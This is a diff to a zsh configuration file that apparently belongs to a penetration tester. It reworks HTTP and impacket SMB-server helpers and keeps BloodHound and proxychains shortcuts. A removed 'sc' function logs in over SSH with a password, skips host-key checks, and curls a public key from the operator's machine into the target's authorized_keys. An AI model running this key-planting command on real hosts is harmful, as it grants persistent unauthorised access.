@@ -6,7 +6,7 @@ export EDITOR=nvim
 export WORDCHARS=${WORDCHARS//*}
 export NUSER=$(getent passwd 1000 | cut -d: -f1)
 export WORKDIR="/home/$NUSER/Workdir"
-export PATH=$PATH:/home/$NUSER/.local/bin:/home/$NUSER/.go/bin
+export PATH=$PATH:/home/$NUSER/.local/bin:/home/$NUSER/go/bin
 
 # Plugins
 plugins=(git docker zsh-syntax-highlighting zsh-autosuggestions sudo)
@@ -52,18 +52,54 @@ alias cdw='cd $WORKDIR'
 alias target='echo "$@" > /home/$NUSER/.target'
 alias IP=$'ip link show tun0 &>/dev/null && ip addr show tun0 | grep \'inet \' | awk \'{ print $2 }\' | cut -d/ -f1|| hostname -I | awk \'{ print $1 }\''
 alias stty-size='echo -e "stty rows $(tput lines) columns $(tput cols)\nexport TERM=xterm\nexport SHELL=/bin/bash"'
-alias http='python3 -m http.server'
-alias smb='impacket-smbserver -smb2support -username $USER -password $USER'
 alias vpn='sudo openvpn'
 alias p='proxychains -q'
 alias c='xsel -bi'
 
 # Functions
-docker-clean () {
+http() {
+    local port=${1:-80}
+    /usr/bin/python3 -m http.server "$port"
+}
+
+smb() {
+    local sharename="shared"
+    local path="."
+    local user="$USER"
+    local password="$USER"
+    local additional_args=()
+    
+    while [ $# -gt 0 ]; do
+        case "$1" in
+            -u|--user)
+                user="$2"
+                shift 2
+                ;;
+            -p|--password)
+                password="$2"
+                shift 2
+                ;;
+            *)
+                if [ -z "$sharename" ] || [ "$sharename" = "SHARE" ]; then
+                    sharename="$1"
+                elif [ -z "$path" ] || [ "$path" = "." ]; then
+                    path="$1"
+                else
+                    additional_args+=("$1")
+                fi
+                shift
+                ;;
+        esac
+    done
+    
+    /usr/bin/python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support "$sharename" "$path" -username "$user" -password "$password" "${additional_args[@]}"
+}
+
+docker-clean() {
     docker system prune --all --volumes
 }
 
-bloodhound () {
+bloodhound() {
     if [ "$1" = "start" ]; then
         sudo /opt/bloodhound/bloodhound-cli containers up
         port=$(grep -oP 'BLOODHOUND_PORT=\K\d+' /opt/bloodhound/.env)
@@ -91,16 +127,4 @@ s() {
                               -o GlobalKnownHostsFile=/dev/null \
                               -o UserKnownHostsFile=/dev/null \
                               "${args[@]}"
-}
-
-sc() {
-    if [ $# -lt 2 ]; then
-        echo '[!] Usage: sc <user>@<host> <password>'
-        return 1
-    fi
-
-    sshpass -p "$2" ssh -o StrictHostKeyChecking=no \
-                              -o GlobalKnownHostsFile=/dev/null \
-                              -o UserKnownHostsFile=/dev/null \
-                              "$1" "curl -s http://$(IP)/shells/id_rsa.pub >> ~/.ssh/authorized_keys"
 }
